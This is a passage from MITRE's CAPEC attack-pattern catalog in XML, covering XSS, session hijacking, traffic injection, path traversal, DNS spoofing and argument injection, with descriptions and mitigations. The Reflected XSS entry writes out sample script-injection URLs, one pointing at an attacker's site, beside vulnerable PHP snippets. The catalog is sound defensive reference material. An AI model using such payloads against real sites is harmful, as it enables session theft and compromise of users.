         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Blocking packets intended for a target IP address denies its availability to the user.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Have a large pool of backup IPs built into the application and support proxy capability in the application.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Consider situations of information censorship for political purposes, where regimes that prevent access to specific web services.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="300"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-475"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-12</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Vulnerabilities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="591" Name="Reflected XSS" Abstraction="Detailed" Status="Stable">
         <Description>This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is “reflected” off a vulnerable web application and then executed by a victim's browser. The process starts with an adversary delivering a malicious script to a victim and convincing the victim to send the script to the vulnerable web application. The most common method of this is through a phishing email where the adversary embeds the malicious script with a URL that the victim then clicks on. In processing the subsequent request, the vulnerable web application incorrectly considers the malicious script as valid input and uses it to creates a reposnse that is then sent back to the victim. To launch a successful Reflected XSS attack, an adversary looks for places where user-input is used directly in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (&lt;img&gt;), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="63"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An application that leverages a client-side web browser with scripting enabled.</Prerequisite>
            <Prerequisite>An application that fail to adequately sanitize or encode untrusted input.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Requires the ability to write malicious scripts and embed them into HTTP requests.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>A successful Reflected XSS attack can enable an adversary to exfiltrate sensitive information from the application.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Authorization</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges</Impact>
               <Note>A successful Reflected XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>A successful Reflected attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>A successful Reflected attack can allow an adversary to tamper with application data.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use browser technologies that do not allow client-side scripting.</Mitigation>
            <Mitigation>Utilize strict type, character, and encoding enforcement.</Mitigation>
            <Mitigation>Ensure that all user-supplied input is validated before use.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://my.site.com/aform.html?mode=full</xhtml:div>
               <xhtml:p>The application’s server-side code may want to display this mode value in the HTML page being created to give the users an understanding of what mode they are in. In this example, PHP is used to pull the value from the URL and generate the desired HTML.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;?php<xhtml:br/>echo 'Mode is: ' . $_GET["mode"];<xhtml:br/>?&gt;</xhtml:div>
               <xhtml:p>Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">http://my.site.com/aform.html?mode=&lt;script&gt;alert('hi');&lt;/script&gt;</xhtml:div>
            </Example>
            <Example>
               <xhtml:p>Reflected XSS attacks can take advantage of HTTP headers to compromise a victim. For example, assume a vulnerable web application called ‘mysite’ dynamically generates a link using an HTTP header such as HTTP_REFERER. Code somewhere in the application could look like:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;?php<xhtml:br/>echo "&lt;a href=”$_SERVER[‘HTTP_REFERER’]”&gt;Test URL&lt;/a&gt;"<xhtml:br/>?&gt;</xhtml:div>
               <xhtml:p>The HTTP_REFERER header is populated with the URI that linked to the currently executing page. A web site can be created and hosted by an adversary that takes advantage of this by adding a reference to the vulnerable web application. By tricking a victim into clicking a link that executes the attacker’s web page, such as:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">"http://attackerswebsite.com?&lt;script&gt;malicious content&lt;/script&gt;"</xhtml:div>
               <xhtml:p>The vulnerable web application (‘mysite’) is now called via the attacker’s web site, initiated by the victim’s web browser. The HTTP_REFERER header will contain a malicious script, which is embedded into the page by the vulnerable application and served to the victim. The victim’s web browser then executes the injected script, thus compromising the victim’s machine.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="79"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-476"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2017-04-15</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="592" Name="Stored XSS" Abstraction="Detailed" Status="Stable">
         <Description>This type of attack is a form of Cross-site Scripting (XSS) where a malicious script is persistenly “stored” within the data storage of a vulnerable web application. Initially presented by an adversary to the vulnerable web application, the malicious script is incorrectly considered valid input and is not properly encoded by the web application. A victim is then convinced to use the web application in a way that creates a response that includes the malicious script. This response is subsequently sent to the victim and the malicious script is executed by the victim's browser. To launch a successful Stored XSS attack, an adversary looks for places where stored input data is used in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (&lt;img&gt;), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="63"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An application that leverages a client-side web browser with scripting enabled.</Prerequisite>
            <Prerequisite>An application that fails to adequately sanitize or encode untrusted input.</Prerequisite>
            <Prerequisite>An application that stores information provided by the user in data storage of some kind.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Requires the ability to write scripts of varying complexity and to inject them through user controlled fields within the application.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>A successful Stored XSS attack can enable an adversary to exfiltrate sensitive information from the application.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Authorization</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges</Impact>
               <Note>A successful Stored XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>A successful Stored XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>A successful Stored XSS attack can allow an adversary to tamper with application data.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use browser technologies that do not allow client-side scripting.</Mitigation>
            <Mitigation>Utilize strict type, character, and encoding enforcement.</Mitigation>
            <Mitigation>Ensure that all user-supplied input is validated before being stored.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary determines that a system uses a web based interface for administration. The adversary creates a new user record and supplies a malicious script in the user name field. The user name field is not validated by the system and a new log entry is created detailing the creation of the new user. Later, an administrator reviews the log in the administrative console. When the administrator comes across the new user entry, the browser sees a script and executes it, stealing the administrator's authentication cookie and forwarding it to the adversary. An adversary then uses the received authentication cookie to log in to the system as an administrator, provided that the administrator console can be accessed remotely.</Example>
            <Example>An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. An adversary embeds JavaScript in the image tags of his message. The adversary then sends the victim an email advertising free goods and provides a link to the form for how to collect. When the victim visits the forum and reads the message, the malicious script is executed within the victim's browser.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="79"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2017-04-15</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="593" Name="Session Hijacking" Abstraction="Standard" Status="Stable">
         <Description>This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="21"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An application that leverages sessions to perform authentication.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Exploiting a poorly protected identity token is a well understood attack with many helpful resources available.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The adversary must have the ability to communicate with the application over the network.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Gain Privileges</Impact>
               <Note>A successful attack can enable an adversary to gain unauthorized access to an application.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="287"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2017-04-15</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="594" Name="Traffic Injection" Abstraction="Meta" Status="Stable">
         <Description>An adversary injects traffic into the target's network connection. The adversary is therefore able to degrade or disrupt the connection, and potentially modify the content. This is not a flooding attack, as the adversary is not focusing on exhausting resources. Instead, the adversary is crafting a specific input to affect the system in a particular way.</Description>
         <Prerequisites>
            <Prerequisite>The target application must leverage an open communications channel.</Prerequisite>
            <Prerequisite>The channel on which the target communicates must be vulnerable to interception (e.g., man in the middle attack).</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool, such as a MITM Proxy, that is capable of generating and injecting custom inputs to be used in the attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Note>The injection of specific content into a connection can trigger a disruption in that communications channel, thereby denying availability of the service.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Other</Impact>
               <Note>An adversary's injection of additional content into a communication channel negatively impacts the integrity of that channel.</Note>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="940"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-03</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="595" Name="Connection Reset" Abstraction="Standard" Status="Draft">
         <Description>In this attack pattern, an adversary injects a connection reset packet to one or both ends of a target's connection. The attacker is therefore able to have the target and/or the destination server sever the connection without having to directly filter the traffic between them.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="594"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This attack requires the ability to monitor the target's network connection.</Prerequisite>
         </Prerequisites>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="940"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-04</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="596" Name="TCP RST Injection" Abstraction="Detailed" Status="Draft">
         <Description>An adversary injects one or more TCP RST packets to a target after the target has made a HTTP GET request. The goal of this attack is to have the target and/or destination web server terminate the TCP connection.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="595"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An On/In Path Device</Prerequisite>
         </Prerequisites>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="940"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-477"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-03</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="597" Name="Absolute Path Traversal" Abstraction="Detailed" Status="Draft">
         <Description>An adversary with access to file system resources, either directly or via application logic, will use various file absolute paths and navigation mechanisms such as ".." to extend their range of access to inappropriate areas of the file system. The goal of the adversary is to access directories and files that are intended to be restricted from their access.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="126"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must leverage and access an underlying file system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Simple command line attacks.</Skill>
            <Skill Level="Medium">Programming attacks.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The attacker must have access to an application interface or a direct shell that allows them to inject directory strings and monitor the results.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
               <Note>The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Configure the access control correctly.</Mitigation>
            <Mitigation>Design: Enforce principle of least privilege.</Mitigation>
            <Mitigation>Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.</Mitigation>
            <Mitigation>Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement.</Mitigation>
            <Mitigation>Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.</Mitigation>
            <Mitigation>Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.</Mitigation>
            <Mitigation>Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content, including remote and user-generated content.</Mitigation>
            <Mitigation>Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.</Mitigation>
            <Mitigation>Implementation: Use indirect references rather than actual file names.</Mitigation>
            <Mitigation>Implementation: Use possible permissions on file access when developing and deploying web applications.</Mitigation>
            <Mitigation>Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="36"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2017-01-06</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="598" Name="DNS Spoofing" Abstraction="Detailed" Status="Draft">
         <Description>An adversary sends a malicious ("NXDOMAIN" ("No such domain") code, or DNS A record) response to a targets route request before a legitimate resolver can. This technique requires an On-path or In-path device that can monitor and respond to the targets DNS requests. This attack differs from BGP Tampering in that it directly responds to requests made by the target instead of polluting the routing the targets infrastructure uses.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="194">
               <Exclude_Related Exclude_ID="403"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>On/In Path Device</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To distribute email</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Design: Avoid dependence on DNS</Mitigation>
            <Mitigation>Design: Include "hosts file"/IP address in the application</Mitigation>
            <Mitigation>Implementation: Utilize a .onion domain with Tor support</Mitigation>
            <Mitigation>Implementation: DNSSEC</Mitigation>
            <Mitigation>Implementation: DNS-hold-open</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Below-Recursive DNS Poisoning: When an On/In-path device between a recursive DNS server and a user sends a malicious ("NXDOMAIN" ("No such domain") code, or DNS A record ) response before a legitimate resolver can.</Example>
            <Example>Above-Recursive DNS Poisoning: When an On/In-path device between an authority server (e.g., government-managed) and a recursive DNS server sends a malicious ("NXDOMAIN" ("No such domain")code, or a DNS record) response before a legitimate resolver can.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-477"/>
            <Reference External_Reference_ID="REF-479"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-04</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="599" Name="Terrestrial Jamming" Abstraction="Detailed" Status="Draft">
         <Description>In this attack pattern, the adversary transmits disruptive signals in the direction of the target consumer-level satellite dish (as opposed to the satellite itself). The transmission disruption occurs in a more targeted range. Portable terrestrial jammers have a range of 3-5 kilometers in urban areas and 20 kilometers in rural areas. This technique requires a terrestrial jammer that is more powerful than the frequencies sent from the satellite.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="195">
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Resources_Required>
            <Resource>
               <xhtml:p>A terrestrial satellite jammer with a signal more powerful than that of the satellite attempting to communicate with the target.</xhtml:p>
               <xhtml:p>The adversary must know the location of the target satellite dish.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>A successful attack will deny, degrade, or disrupt availability of satellite communications for the target by overwhelming its resources to accurately receive authorized transmissions.</Note>
            </Consequence>
         </Consequences>
         <Example_Instances>
            <Example>An attempt to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These jamming signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-462"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-12</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="6" Name="Argument Injection" Abstraction="Standard" Status="Draft">
         <Description>An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="137"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Discovery of potential injection vectors] Using an automated tool or manual discovery, the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS, API, SQL procedures, etc.).</Description>
               <Technique>Manually cover the application and record the possible places where arguments could be passed into external systems.</Technique>
               <Technique>Use a spider, for web applications, to create a list of URLs and associated inputs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[1. Attempt variations on argument content] Possibly using an automated tool, the attacker will perform injection variations of the arguments.</Description>
               <Technique>Use a very large list of probe strings in order to detect if there is a positive result, and, what type of system has been targeted (if obscure).</Technique>
               <Technique>Use a proxy tool to record results, error messages and/or log if accessible.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Abuse of the application] The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.</Description>
               <Technique>Manually inject specific payload into targeted argument.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.</Prerequisite>
            <Prerequisite>Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker has to identify injection vector, identify the operating system-specific commands, and optionally collect the output.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.</Mitigation>
            <Mitigation>Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.</Mitigation>
            <Mitigation>Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [R.6.2]</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="146"/>
            <Related_Weakness CWE_ID="184"/>
            <Related_Weakness CWE_ID="78"/>
            <Related_Weakness CWE_ID="185"/>
            <Related_Weakness CWE_ID="713"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-482"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="60" Name="Reusing Session IDs (aka Session Replay)" Abstraction="Detailed" Status="Draft">
         <Description>This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="593"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
